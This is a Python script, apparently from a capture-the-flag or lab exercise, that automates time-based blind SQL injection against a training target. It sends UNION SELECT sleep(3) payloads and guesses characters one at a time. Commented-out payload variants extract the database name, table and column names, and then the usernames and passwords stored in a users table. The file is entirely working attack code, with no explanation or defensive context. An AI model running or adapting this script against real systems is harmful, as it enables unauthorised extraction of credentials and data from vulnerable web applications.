#!/usr/bin/env python3

import requests
import time

url = 'http://10.10.10.10/run'
characters = 'abcdefghijklmnopqrstuvwxyz0123456789-,\'"[].<>?!@#$^&*+=;|/\\()}{:'
name = ''
counter = 0

while True:
	for i in characters:
		
		# Get schema name
		# payload = "level=4&sql=select * from analytics_referrers where domain=''union select sleep(3),2 where database() like '" + name + i + "%';--' LIMIT 1"

		# Get table names
		# payload = "level=4&sql=select * from analytics_referrers where domain=''union select sleep(3),2 from information_schema.tables where table_schema = 'sqli_four' and table_name like '" + name + i + "%';--' LIMIT 1"
		
		# Get column names
		#payload = "level=4&sql=select * from analytics_referrers where domain=''union select sleep(3),2 from information_schema.columns where table_name = 'users' and column_name like '" + name + i + "%';--' LIMIT 1"
		
		# Get username
		# payload = "level=4&sql=select * from analytics_referrers where domain=''union select sleep(3),2 from users where username like '" + name + i + "%';--' LIMIT 1"

		# Get password
		#payload = "level=4&sql=select * from analytics_referrers where domain=''union select sleep(3),2 from users where password like '" + name + i + "%';--' LIMIT 1"

		headers = {'Content-Type':'application/x-www-form-urlencoded',}

		start = time.time()
		r = requests.post(url, data = payload, headers = headers)
		end = time.time()

		# Check if correct
		if (end - start) > 2:
			name = name + i
			counter = 0

		# Sending a '_' will always work, this gets around that issue
		if i == 'a':
			counter += 1

		if counter == 2:
			name = name + '_'
			counter = 0

		# Check if done
		if '__' in name:
			print('Name: ' + name[:-2])
			exit()
		
		print('trying: ' + name + i)